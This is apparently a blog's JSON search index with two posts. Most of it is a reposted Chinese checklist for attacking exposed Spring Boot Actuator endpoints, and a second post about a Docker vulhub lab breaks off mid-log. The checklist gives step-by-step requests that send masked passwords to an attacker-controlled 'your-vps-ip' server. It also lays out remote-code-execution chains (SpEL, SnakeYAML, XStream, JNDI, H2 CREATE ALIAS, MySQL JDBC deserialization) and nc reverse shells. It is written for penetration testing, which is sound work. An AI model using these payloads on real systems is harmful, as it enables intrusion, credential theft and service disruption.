    "content"  : "声明这是转载地址，若作者介意请联系：「administrator@sentrylab.cn」删除转载文章SpringBootVulnerabilityExploitCheckListSpringBoot相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估checklistBin4xinedited.SourcefromLandGrey零：路由和版本0x01：路由知识SpringBoot1.x版本默认内置路由的根路径以/开始，2.x则统一以/actuator开始有些程序员会自定义/manage、/management或项目相关名称为根路径默认内置路由名字，如/env有时候也会被程序员修改，如修改成/appenv0x02：版本知识SpringCloud是基于SpringBoot来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。常见组件的版本相互依赖关系：依赖项版本列表及依赖组件版本spring-boot-starter-parentspring-boot-starter-parentspring-boot-dependenciesspring-boot-dependenciesspring-cloud-dependenciesspring-cloud-dependenciesSpringCloud与SpringBoot大版本之间的依赖关系：SpringCloudSpringBootAngel兼容SpringBoot1.2.xBrixton兼容SpringBoot1.3.x、1.4.xCamden兼容SpringBoot1.4.x、1.5.xDalston兼容SpringBoot1.5.x，不兼容2.0.xEdgware兼容SpringBoot1.5.x，不兼容2.0.xFinchley兼容SpringBoot2.0.x，不兼容1.5.xGreenwich兼容SpringBoot2.1.xHoxton兼容SpringBoot2.2.xSpringCloud小版本号的后缀及含义:版本号后缀含义BUILD-SNAPSHOT快照版，代码不是固定，处于变化之中MX里程碑版RCX候选发布版RELEASE正式发布版SRX(修复错误和bug并再次发布的)正式发布版一：信息泄露0x01：路由地址及接口调用详情泄漏开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞直接访问以下几个路由，验证漏洞是否存在：/api-docs/v2/api-docs/swagger-ui.html一些可能会遇到的接口路由变形：/api.html/sw/swagger-ui.html/api/swagger-ui.html/template/swagger-ui.html/spring-security-rest/api/swagger-ui.html/spring-security-oauth-resource/swagger-ui.html除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：/mappings/actuator/mappings/metrics/actuator/metrics/beans/actuator/beans/configprops/actuator/configprops一般来讲，知道springboot应用的相关接口和传参信息并不能算是漏洞；但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。0x02：配置不当而暴露的路由主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置参考production-ready-endpoints和spring-boot.txt，可能因为配置不当而暴露的默认内置路由可能会有：/actuator/auditevents/autoconfig/beans/caches/conditions/configprops/docs/dump/env/flyway/health/heapdump/httptrace/info/intergrationgraph/jolokia/logfile/loggers/liquibase/metrics/mappings/prometheus/refresh/scheduledtasks/sessions/shutdown/trace/threaddump/actuator/auditevents/actuator/beans/actuator/health/actuator/conditions/actuator/configprops/actuator/env/actuator/info/actuator/loggers/actuator/heapdump/actuator/threaddump/actuator/metrics/actuator/scheduledtasks/actuator/httptrace/actuator/mappings/actuator/jolokia/actuator/hystrix.stream其中对寻找漏洞比较重要接口的有：/env、/actuator/envGET请求/env会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范(例如password写成psasword、pwd)时，会泄露密码明文；同时有一定概率可以通过POST请求/env接口设置一些属性，触发相关RCE漏洞。/jolokia通过/jolokia/list接口寻找可以利用的MBean，触发相关RCE漏洞；/trace一些http请求包访问跟踪信息，有可能发现有效的cookie信息0x03：获取被星号脱敏的密码的明文(方法一)访问/env接口时，springactuator会将一些带有敏感关键词(如password、secret)的属性名对应的属性值用*号替换达到脱敏的效果利用条件：目标网站存在/jolokia或/actuator/jolokia接口目标使用了jolokia-core依赖（版本要求暂未知）利用方法：步骤一：找到想要获取的属性名GET请求目标网站的/env或/actuator/env接口，搜索******关键词，找到想要获取的被星号*遮掩的属性值对应的属性名。步骤二：jolokia调用相关Mbean获取明文将下面示例中的security.user.password替换为实际要获取的属性名，直接发包；明文值结果包含在response数据包中的value键中。调用org.springframework.bootMbean（可能更通用）实际上是调用org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar类实例的getProperty方法spring1.xPOST/jolokiaContent-Type:application/json{\"mbean\":\"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\":\"getProperty\",\"type\":\"EXEC\",\"arguments\":[\"security.user.password\"]}spring2.xPOST/actuator/jolokiaContent-Type:application/json{\"mbean\":\"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\":\"getProperty\",\"type\":\"EXEC\",\"arguments\":[\"security.user.password\"]}调用org.springframework.cloud.context.environmentMbean（需要springcloud相关依赖）实际上是调用org.springframework.cloud.context.environment.EnvironmentManager类实例的getProperty方法spring1.xPOST/jolokiaContent-Type:application/json{\"mbean\":\"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\":\"getProperty\",\"type\":\"EXEC\",\"arguments\":[\"security.user.password\"]}spring2.xPOST/actuator/jolokiaContent-Type:application/json{\"mbean\":\"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\":\"getProperty\",\"type\":\"EXEC\",\"arguments\":[\"security.user.password\"]}0x04：获取被星号脱敏的密码的明文(方法二)访问/env接口时，springactuator会将一些带有敏感关键词(如password、secret)的属性名对应的属性值用*号替换达到脱敏的效果利用条件：可以GET请求目标网站的/env可以POST请求目标网站的/env可以POST请求目标网站的/refresh接口刷新配置（存在spring-boot-starter-actuator依赖）目标使用了spring-cloud-starter-netflix-eureka-client依赖目标可以请求攻击者的服务器（请求可出外网）利用方法：步骤一：找到想要获取的属性名GET请求目标网站的/env或/actuator/env接口，搜索******关键词，找到想要获取的被星号*遮掩的属性值对应的属性名。步骤二：使用nc监听HTTP请求在自己控制的外网服务器上监听80端口：nc-lvk80步骤三：设置eureka.client.serviceUrl.defaultZone属性将下面http://value:${security.user.password}@your-vps-ip中的security.user.password换成自己想要获取的对应的星号*遮掩的属性名；your-vps-ip换成自己外网服务器的真实ip地址。spring1.xPOST/envContent-Type:application/x-www-form-urlencodedeureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ipspring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://value:${security.user.password}@your-vps-ip\"}步骤四：刷新配置spring1.xPOST/refreshContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/refreshContent-Type:application/json步骤五：解码属性值正常的话，此时nc监听的服务器会收到目标发来的请求，其中包含类似如下Authorization头内容：Authorization:BasicdmFsdWU6MTIzNDU2将其中的dmFsdWU6MTIzNDU2部分使用base64解码，即可获得类似明文值value:123456，其中的123456即是目标星号*脱敏前的属性值明文。0x05：获取被星号脱敏的密码的明文(方法三)访问/env接口时，springactuator会将一些带有敏感关键词(如password、secret)的属性名对应的属性值用*号替换达到脱敏的效果利用条件：通过POST/env设置属性触发目标对外网指定地址发起任意http请求目标可以请求攻击者的服务器（请求可出外网）利用方法：参考UUUUnotfound提出的issue-1，可以在目标发外部http请求的过程中，在urlpath中利用占位符带出数据步骤一：找到想要获取的属性名GET请求目标网站的/env或/actuator/env接口，搜索******关键词，找到想要获取的被星号*遮掩的属性值对应的属性名。步骤二：使用nc监听HTTP请求在自己控制的外网服务器上监听80端口：nc-lvk80步骤三：触发对外http请求spring.cloud.bootstrap.location方法（同时适用于明文数据中有特殊url字符的情况）：spring1.xPOST/envContent-Type:application/x-www-form-urlencodedspring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}spring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/?=${security.user.password}\"}eureka.client.serviceUrl.defaultZone方法（不适用于明文数据中有特殊url字符的情况）：spring1.xPOST/envContent-Type:application/x-www-form-urlencodedeureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}spring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/${security.user.password}\"}步骤四：刷新配置spring1.xPOST/refreshContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/refreshContent-Type:application/json0x06：获取被星号脱敏的密码的明文(方法四)访问/env接口时，springactuator会将一些带有敏感关键词(如password、secret)的属性名对应的属性值用*号替换达到脱敏的效果利用条件：可正常GET请求目标/heapdump或/actuator/heapdump接口利用方法：步骤一：找到想要获取的属性名GET请求目标网站的/env或/actuator/env接口，搜索******关键词，找到想要获取的被星号*遮掩的属性值对应的属性名。步骤二：下载jvmheap信息下载的heapdump文件大小通常在50M—500M之间，有时候也可能会大于2GGET请求目标的/heapdump或/actuator/heapdump接口，下载应用实时的JVM堆信息步骤三：使用MAT获得jvmheap中的密码明文参考文章方法，使用EclipseMemoryAnalyzer工具的OQL语句select*fromorg.springframework.web.context.support.StandardServletEnvironment，辅助快速过滤分析，获得密码明文二：远程代码执行由于springboot相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准0x01：whitelabelerrorpageSpELRCE利用条件：springboot1.1.0-1.1.12、1.2.0-1.2.7、1.3.0至少知道一个触发springboot默认错误页面的接口及参数名利用方法：步骤一：找到一个正常传参处比如发现访问/article?id=xxx，页面会报状态码为500的错误：WhitelabelErrorPage，则后续payload都将会在参数id处尝试。步骤二：执行SpEL表达式输入/article?id=${7*7}，如果发现报错页面将7*7的值49计算出来显示在报错页面上，那么基本可以确定目标存在SpEL表达式注入漏洞。由字符串格式转换成0x**java字节形式，方便执行任意代码：#coding:utf-8result=\"\"target='open-aCalculator'forxintarget:result+=hex(ord(x))+\",\"print(result.rstrip(','))执行open-aCalculator命令${T(java.lang.Runtime).getRuntime().exec(newString(newbyte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}漏洞原理：springboot处理参数值出错，流程进入org.springframework.util.PropertyPlaceholderHelper类中此时URL中的参数值会用parseStringValue方法进行递归解析其中${}包围的内容都会被org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration类的resolvePlaceholder方法当作SpEL表达式被解析执行，造成RCE漏洞漏洞分析：​\tSpringBootSpEL表达式注入漏洞-分析与复现漏洞环境：repository/springboot-spel-rce正常访问：http://127.0.0.1:9091/article?id=66执行open-aCalculator命令：http://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}0x02：springcloudSnakeYAMLRCE利用条件：可以POST请求目标网站的/env接口设置属性可以POST请求目标网站的/refresh接口刷新配置（存在spring-boot-starter-actuator依赖）目标依赖的spring-cloud-starter版本&lt;1.3.0.RELEASE目标可以请求攻击者的HTTP服务器（请求可出外网）利用方法：步骤一：托管yml和jar文件在自己控制的vps机器上开启一个简单HTTP服务器，端口尽量使用常见HTTP服务端口（80、443）#使用python快速开启httpserverpython2-mSimpleHTTPServer80python3-mhttp.server80在网站根目录下放置后缀为yml的文件example.yml，内容如下：!!javax.script.ScriptEngineManager[!!java.net.URLClassLoader[[!!java.net.URL[\"http://your-vps-ip/example.jar\"]]]]在网站根目录下放置后缀为jar的文件example.jar，内容是要执行的代码，代码编写及编译方式参考yaml-payload。步骤二：设置spring.cloud.bootstrap.location属性spring1.xPOST/envContent-Type:application/x-www-form-urlencodedspring.cloud.bootstrap.location=http://your-vps-ip/example.ymlspring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/example.yml\"}步骤三：刷新配置spring1.xPOST/refreshContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/refreshContent-Type:application/json漏洞原理：spring.cloud.bootstrap.location属性被设置为外部恶意yml文件URL地址refresh触发目标机器请求远程HTTP服务器上的yml文件，获得其内容SnakeYAML由于存在反序列化漏洞，所以解析恶意yml内容时会完成指定的动作先是触发java.net.URL去拉取远程HTTP服务器上的恶意jar文件然后是寻找jar文件中实现javax.script.ScriptEngineFactory接口的类并实例化实例化类时执行恶意代码，造成RCE漏洞漏洞分析：​\tExploitSpringBootActuator之SpringCloudEnv学习笔记漏洞环境：repository/springcloud-snakeyaml-rce正常访问：http://127.0.0.1:9092/env0x03：eurekaxstreamdeserializationRCE利用条件：可以POST请求目标网站的/env接口设置属性可以POST请求目标网站的/refresh接口刷新配置（存在spring-boot-starter-actuator依赖）目标使用的eureka-client&lt;1.8.7（通常包含在spring-cloud-starter-netflix-eureka-client依赖中）目标可以请求攻击者的HTTP服务器（请求可出外网）利用方法：步骤一：架设响应恶意XStreampayload的网站提供一个依赖Flask并符合要求的python脚本示例，作用是利用目标Linux机器上自带的python来反弹shell。使用python在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹shell的ip地址和端口号。步骤二：监听反弹shell的端口一般使用nc监听端口，等待反弹shellnc-lvp443步骤三：设置eureka.client.serviceUrl.defaultZone属性spring1.xPOST/envContent-Type:application/x-www-form-urlencodedeureka.client.serviceUrl.defaultZone=http://your-vps-ip/examplespring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/example\"}步骤四：刷新配置spring1.xPOST/refreshContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/refreshContent-Type:application/json漏洞原理：eureka.client.serviceUrl.defaultZone属性被设置为恶意的外部eurekaserverURL地址refresh触发目标机器请求远程URL，提前架设的fakeeurekaserver就会返回恶意的payload目标机器相关依赖解析payload，触发XStream反序列化，造成RCE漏洞漏洞分析：​\tSpringBootActuator从未授权访问到getshell漏洞环境：repository/springboot-eureka-xstream-rce正常访问：http://127.0.0.1:9093/env0x04：jolokialogbackJNDIRCE利用条件：目标网站存在/jolokia或/actuator/jolokia接口目标使用了jolokia-core依赖（版本要求暂未知）并且环境中存在相关MBean目标可以请求攻击者的HTTP服务器（请求可出外网）JNDI注入受目标JDK版本影响，jdk&lt;6u201/7u191/8u182/11.0.1（LDAP方式）利用方法：步骤一：查看已存在的MBeans访问/jolokia/list接口，查看是否存在ch.qos.logback.classic.jmx.JMXConfigurator和reloadByURL关键词。步骤二：托管xml文件在自己控制的vps机器上开启一个简单HTTP服务器，端口尽量使用常见HTTP服务端口（80、443）#使用python快速开启httpserverpython2-mSimpleHTTPServer80python3-mhttp.server80在根目录放置以xml结尾的example.xml文件，内容如下：&lt;configuration&gt;&lt;insertFromJNDIenv-entry-name=\"ldap://your-vps-ip:1389/JNDIObject\"as=\"appName\"/&gt;&lt;/configuration&gt;步骤三：准备要执行的Java代码编写优化过后的用来反弹shell的Java示例代码JNDIObject.java，使用兼容低版本jdk的方式编译：javac-source1.5-target1.5JNDIObject.java然后将生成的JNDIObject.class文件拷贝到步骤二中的网站根目录。步骤四：架设恶意ldap服务下载marshalsec，使用下面命令架设对应的ldap服务：java-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.LDAPRefServerhttp://your-vps-ip:80/#JNDIObject1389步骤五：监听反弹shell的端口一般使用nc监听端口，等待反弹shellnc-lv443步骤六：从外部URL地址加载日志配置文件⚠️如果目标成功请求了example.xml并且marshalsec也接收到了目标请求，但是目标没有请求JNDIObject.class，大概率是因为目标环境的jdk版本太高，导致JNDI利用失败。替换实际的your-vps-ip地址访问URL触发漏洞：/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml漏洞原理：直接访问可触发漏洞的URL，相当于通过jolokia调用ch.qos.logback.classic.jmx.JMXConfigurator类的reloadByURL方法目标机器请求外部日志配置文件URL地址，获得恶意xml文件内容目标机器使用saxParser.parse解析xml文件(这里导致了xxe漏洞)xml文件中利用logback依赖的insertFormJNDI标签，设置了外部JNDI服务器地址目标机器请求恶意JNDI服务器，导致JNDI注入，造成RCE漏洞漏洞分析：​\tspringbootactuatorrceviajolokia漏洞环境：repository/springboot-jolokia-logback-rce正常访问：http://127.0.0.1:9094/env0x05：jolokiaRealmJNDIRCE利用条件：目标网站存在/jolokia或/actuator/jolokia接口目标使用了jolokia-core依赖（版本要求暂未知）并且环境中存在相关MBean目标可以请求攻击者的服务器（请求可出外网）JNDI注入受目标JDK版本影响，jdk&lt;6u141/7u131/8u121（RMI方式）利用方法：步骤一：查看已存在的MBeans访问/jolokia/list接口，查看是否存在type=MBeanFactory和createJNDIRealm关键词。步骤二：准备要执行的Java代码编写优化过后的用来反弹shell的Java示例代码JNDIObject.java。步骤三：托管class文件在自己控制的vps机器上开启一个简单HTTP服务器，端口尽量使用常见HTTP服务端口（80、443）#使用python快速开启httpserverpython2-mSimpleHTTPServer80python3-mhttp.server80将步骤二中编译好的class文件拷贝到HTTP服务器根目录。步骤四：架设恶意rmi服务下载marshalsec，使用下面命令架设对应的rmi服务：java-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.RMIRefServerhttp://your-vps-ip:80/#JNDIObject1389步骤五：监听反弹shell的端口一般使用nc监听端口，等待反弹shellnc-lvp443步骤六：发送恶意payload根据实际情况修改springboot-realm-jndi-rce.py脚本中的目标地址，RMI地址、端口等信息，然后在自己控制的服务器上运行。漏洞原理：利用jolokia调用createJNDIRealm创建JNDIRealm设置connectionURL地址为RMIServiceURL设置contextFactory为RegistryContextFactory停止Realm启动Realm以触发指定RMI地址的JNDI注入，造成RCE漏洞漏洞分析：​\tYetAnotherWaytoExploitSpringBootActuatorsviaJolokia漏洞环境：repository/springboot-jolokia-logback-rce正常访问：http://127.0.0.1:9094/env0x06：h2databasequeryRCE利用条件：可以POST请求目标网站的/env接口设置属性可以POST请求目标网站的/restart接口重启应用（存在spring-boot-starter-actuator依赖）存在com.h2database.h2依赖（版本要求暂未知）利用方法：步骤一：设置spring.datasource.hikari.connection-test-query属性⚠️下面payload中的‘T5’方法每一次执行命令后都需要更换名称(如T6)，然后才能被重新创建使用，否则下次restart重启应用时漏洞不会被触发spring1.x（无回显执行命令）POST/envContent-Type:application/x-www-form-urlencodedspring.datasource.hikari.connection-test-query=CREATEALIAST5ASCONCAT('voidex(Stringm1,Stringm2,Stringm3)throwsException{Runti','me.getRun','time().exe','c(newString[]{m1,m2,m3});}');CALLT5('cmd','/c','calc');spring2.x（无回显执行命令）POST/actuator/envContent-Type:application/json{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATEALIAST5ASCONCAT('voidex(Stringm1,Stringm2,Stringm3)throwsException{Runti','me.getRun','time().exe','c(newString[]{m1,m2,m3});}');CALLT5('cmd','/c','calc');\"}步骤二：重启应用spring1.xPOST/restartContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/restartContent-Type:application/json漏洞原理：spring.datasource.hikari.connection-test-query属性被设置为一条恶意的CREATEALIAS创建自定义函数的SQL语句其属性对应HikariCP数据库连接池的connectionTestQuery配置，定义一个新数据库连接之前被执行的SQL语句restart重启应用，会建立新的数据库连接如果SQL语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成RCE漏洞漏洞分析：​\tremote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database漏洞环境：repository/springboot-h2-database-rce正常访问：http://127.0.0.1:9096/actuator/env0x07：h2databaseconsoleJNDIRCE利用条件：存在com.h2database.h2依赖（版本要求暂未知）spring配置中启用h2consolespring.h2.console.enabled=true目标可以请求攻击者的服务器（请求可出外网）JNDI注入受目标JDK版本影响，jdk&lt;6u201/7u191/8u182/11.0.1（LDAP方式）利用方法：步骤一：访问路由获得jsessionid直接访问目标开启h2console的默认路由/h2-console，目标会跳转到页面/h2-console/login.jsp?jsessionid=xxxxxx，记录下实际的jsessionid=xxxxxx值。步骤二：准备要执行的Java代码编写优化过后的用来反弹shell的Java示例代码JNDIObject.java，使用兼容低版本jdk的方式编译：javac-source1.5-target1.5JNDIObject.java然后将生成的JNDIObject.class文件拷贝到步骤二中的网站根目录。步骤三：托管class文件在自己控制的vps机器上开启一个简单HTTP服务器，端口尽量使用常见HTTP服务端口（80、443）#使用python快速开启httpserverpython2-mSimpleHTTPServer80python3-mhttp.server80将步骤二中编译好的class文件拷贝到HTTP服务器根目录。步骤四：架设恶意ldap服务下载marshalsec，使用下面命令架设对应的ldap服务：java-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.LDAPRefServerhttp://your-vps-ip:80/#JNDIObject1389步骤五：监听反弹shell的端口一般使用nc监听端口，等待反弹shellnc-lv443步骤六：发包触发JNDI注入根据实际情况，替换下面数据中的jsessionid=xxxxxx、www.example.com和ldap://your-vps-ip:1389/JNDIObjectPOST/h2-console/login.do?jsessionid=xxxxxxHost:www.example.comContent-Type:application/x-www-form-urlencodedReferer:http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxxlanguage=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=ldap://your-vps-ip:1389/JNDIObject&amp;user=&amp;password=漏洞分析：​\tSpringBoot+H2数据库JNDI注入漏洞环境：repository/springboot-h2-database-rce正常访问：http://127.0.0.1:9096/h2-console0x08：mysqljdbcdeserializationRCE利用条件：可以POST请求目标网站的/env接口设置属性可以POST请求目标网站的/refresh接口刷新配置（存在spring-boot-starter-actuator依赖）目标环境中存在mysql-connector-java依赖目标可以请求攻击者的服务器（请求可出外网）利用方法：步骤一：查看环境依赖GET请求/env或/actuator/env，搜索环境变量（classpath）中是否有mysql-connector-java关键词，并记录下其版本号（5.x或8.x）；搜索并观察环境变量中是否存在常见的反序列化gadget依赖，比如commons-collections、Jdk7u21、Jdk8u20等；搜索spring.datasource.url关键词，记录下其value值，方便后续恢复其正常jdbcurl值。步骤二：架设恶意roguemysqlserver在自己控制的服务器上运行springboot-jdbc-deserialization-rce.py脚本，并使用ysoserial自定义要执行的命令：java-jarysoserial.jarCommonsCollections3calc&gt;payload.ser在脚本同目录下生成payload.ser反序列化payload文件，供脚本使用。步骤三：设置spring.datasource.url属性⚠️修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！mysql-connector-java5.x版本设置属性值为：jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=truemysql-connector-java8.x版本设置属性值为：jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=truespring1.xPOST/envContent-Type:application/x-www-form-urlencodedspring.datasource.url=对应属性值spring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"spring.datasource.url\",\"value\":\"对应属性值\"}步骤四：刷新配置spring1.xPOST/refreshContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/refreshContent-Type:application/json步骤五：触发数据库查询尝试访问网站已知的数据库查询的接口，例如：/product/list，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发步骤六：恢复正常jdbcurl反序列化漏洞利用完成后，使用步骤三的方法恢复步骤一中记录的spring.datasource.url的原始value值漏洞原理：spring.datasource.url属性被设置为外部恶意mysqljdbcurl地址refresh刷新后设置了一个新的spring.datasource.url属性值当网站进行数据库查询等操作时，会尝试使用恶意mysqljdbcurl建立新的数据库连接然后恶意mysqlserver就会在建立连接的合适阶段返回反序列化payload数据目标依赖的mysql-connector-java就会反序列化设置好的gadget，造成RCE漏洞漏洞分析：​\tNew-Exploit-Technique-In-Java-Deserialization-Attack漏洞环境：需要配置application.properties中的spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上mysql数据库，否则程序启动时就会报错退出repository/springboot-mysql-jdbc-rce正常访问：http://127.0.0.1:9097/actuator/env发送完payload后触发漏洞：http://127.0.0.1:9097/product/list"
  },

  {
    "title"    : "「排错」：Docker启动vulnhub报错排错",
    "category" : "",
    "tags"     : "docker, 技巧, Vulnhub, 笔记",
    "url"      : "/blog/2020/docker-vulnhub-problems/",
    "date"     : "Sep 11, 2020",
    "content"  : "最近在做靶场漏洞复现的时候发现了一个由web虚拟机和db虚拟机一起跑起来的联动靶场环境，下载完镜像后总是报错，思前想后都没办法，于是只能自己来解决问题，虽然结果令人大失所望，但是过程还是挺让人有成就感的，就记录了一下。#docker启服务进入相对应的靶场环境文件夹下起靶场：bin4xin@bin4xin'sMacbookProCVE-2020-9402%docker-composeup-dCreatingnetwork\"cve-2020-9402_default\"withthedefaultdriverCreatingcve-2020-9402_db_1...doneCreatingcve-2020-9402_web_1...donebin4xin@bin4xin'sMacbookProCVE-2020-9402%docker-composepsNameCommandStatePorts-------------------------------------------------------------------------------------------cve-2020-9402_db_1/entrypoint.shUp1521/tcp,5500/tcp,8080/tcpcve-2020-9402_web_1/docker-entrypoint.shpyth...Up0.0.0.0:8000-&gt;8000/tcp我们可以看到对应web服务的端口监听状态：0.0.0.0:8000-&gt;8000/tcp，所以我们直接访问试试看：bin4xin@bin4xin'sMacbookProCVE-2020-9402%curllocalhost:8000curl:(52)Emptyreplyfromserverbin4xin@bin4xin'sMacbookProCVE-2020-9402%docker-composepsNameCommandStatePorts-------------------------------------------------------------------------------------------cve-2020-9402_db_1/entrypoint.shUp1521/tcp,5500/tcp,8080/tcpcve-2020-9402_web_1/docker-entrypoint.shpyth...Up0.0.0.0:8000-&gt;8000/tcpbin4xin@bin4xin'sMacbookProCVE-2020-9402%curl127.0.0.1:8000/vulncurl:(52)Emptyreplyfromserverbin4xin@bin4xin'sMacbookProCVE-2020-9402%docker-composepsNameCommandStatePorts-------------------------------------------------------------------------------------------cve-2020-9402_db_1/entrypoint.shUp1521/tcp,5500/tcp,8080/tcpcve-2020-9402_web_1/docker-entrypoint.shpyth...Up0.0.0.0:8000-&gt;8000/tcp在上面的bash终端代码我们可以看到，我们访问8000端口服务，都是返回Emptyreplyfromserver，我就很郁闷了，明明docker显示状态是Up状态，怎么访问时服务返回空呢。#排错#这是一个有脾气的容器还是不甘心，看了一下本地的ip地址，再次访问看看：bin4xin@bin4xin'sMacbookProshiro%ifconfig|grepinet\tinet127.0.0.1netmask0xff000000\tinet6::1prefixlen128\tinet6fe80::1%lo0prefixlen64scopeid0x1\tinet6fe80::aede:48ff:fe00:1122%en5prefixlen64scopeid0x7\tinet6fe80::146d:ed67:817a:e134%en0prefixlen64securedscopeid0x9\tinet114.97.221.67netmask0xfffffe00broadcast114.97.221.255\tinet6fe80::24e6:3dff:fe1c:7c55%awdl0prefixlen64scopeid0x10\tinet6fe80::24e6:3dff:fe1c:7c55%llw0prefixlen64scopeid0x11\tinet6fe80::9a9a:9906:8f8d:5e0%utun0prefixlen64scopeid0x12\tinet6fe80::8ef2:d44b:f2b0:f37e%utun1prefixlen64scopeid0x13en0:flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt;mtu1500\tinet114.97.221.67bin4xin@bin4xin'sMacbookProshiro%curlhttp://114.97.221.67:8000/vulncurl:(7)Failedtoconnectto114.97.221.67port8000:Connectionrefusedbin4xin@bin4xin'sMacbookProshiro%docker-composepsNameCommandStatePorts------------------------------------------------------------------------------------------------cve-2020-9402_db_1/entrypoint.shUp1521/tcp,5500/tcp,8080/tcpcve-2020-9402_web_1/docker-entrypoint.shpyth...Restarting好家伙，这次直接web服务重启了，有脾气。没办法，直接把整个环境down掉重启。#进容器这次我想到的办法是直接进容器里面去看看服务到底发生了什么：dockerpsa66976bc6d2bcve-2020-9402_web\"/docker-entrypoint.…\"4secondsagoUp3seconds0.0.0.0:8000-&gt;8000/tcpcve-2020-9402_web_1fc99758ce428vulhub/oracle:12c-ee\"/entrypoint.sh\"5secondsagoUp3seconds1521/tcp,5500/tcp,8080/tcpcve-2020-9402_db_1我们可以通过dockerps来查看docker镜像cve-2020-9402_web对应的CONTAINERID，通过这个id值进入容器；bin4xin@bin4xin'sMacbookProCVE-2020-9402%sudodockerexec-ita66976bc6d2b/bin/bashroot@a66976bc6d2b:/usr/src#root@a66976bc6d2b:/usr/src#ps-efUIDPIDPPIDCSTIMETTYTIMECMDroot10006:44?00:00:00/bin/bash/docker-entrypoint.shpythonmanage.pyrunserver0.0.0.0:8000root71006:44?00:00:00bash/usr/local/bin/wait-for-it.sh-t0db:1521--echooracleisuproot560006:45pts/000:00:00/bin/bashroot737006:45?00:00:00sleep1root7456006:45pts/000:00:00ps-ef看了一下，没什么大问题啊，服务该照常启动的都启动了，难道是db服务的问题？就在我疑惑的时候，果然：容器又重启了，我的shell直接掉了，查看一下状态，可不咋地，又restart了，心里苦阿。bin4xin@bin4xin'sMacbookProCVE-2020-9402%dockerpsCONTAINERIDIMAGECOMMANDCREATEDSTATUSPORTSNAMESa66976bc6d2bcve-2020-9402_web\"/docker-entrypoint.…\"2minutesagoRestarting(1)2secondsago#日志排错:-)排错之前看一下docker的打印日志指南%dockerlogs--helpUsage:dockerlogs[OPTIONS]CONTAINERFetchthelogsofacontainerOptions:--detailsShowextradetailsprovidedtologs-f,--followFollowlogoutput--sincestringShowlogssincetimestamp(e.g.2013-01-02T13:23:37)orrelative(e.g.42mfor42minutes)--tailstringNumberoflinestoshowfromtheendofthelogs(default\"all\")-t,--timestampsShowtimestamps--untilstringShowlogsbeforeatimestamp(e.g.2013-01-02T13:23:37)orrelative(e.g.42mfor42minutes)我们可以看到，f参数对应的是log查看的容器id，而我的需求是，对应查看某一个时间段之后的db虚拟机的日志，所以生成命令：dockerlogs--since2020-09-11T14:50:00-fb5731d06d3eaweb的日志:bin4xin@bin4xin'sMacbookProshiro%dockerlogs--since2020-09-11T14:4